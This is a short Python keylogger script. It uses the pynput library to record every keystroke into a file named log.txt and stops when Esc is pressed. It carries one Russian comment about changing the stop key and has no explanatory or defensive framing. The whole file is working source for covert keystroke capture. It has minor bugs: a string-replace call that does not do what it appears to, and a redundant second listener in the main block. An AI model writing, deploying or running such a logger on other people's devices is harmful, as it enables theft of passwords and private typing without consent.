#!/usr/bin/python3

from pynput import keyboard
from pynput.keyboard import Key, Listener

pressedkeys = []


def on_press(key):
    try:
        pressedkeys.append(key.char)
    except AttributeError:
        pressedkeys.append(f" {key} ")

    write(pressedkeys)

def write(pressedkeys):
    with open("log.txt", "w") as file:
        for keybKey in pressedkeys:
            cleankey = str(keybKey).replace("'" and "Key", "")
            file.write(cleankey)

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    # изменить точку остановки


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

for i in range(len(pressedkeys)):
    print(pressedkeys[i])

if __name__ == '__main__':
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()
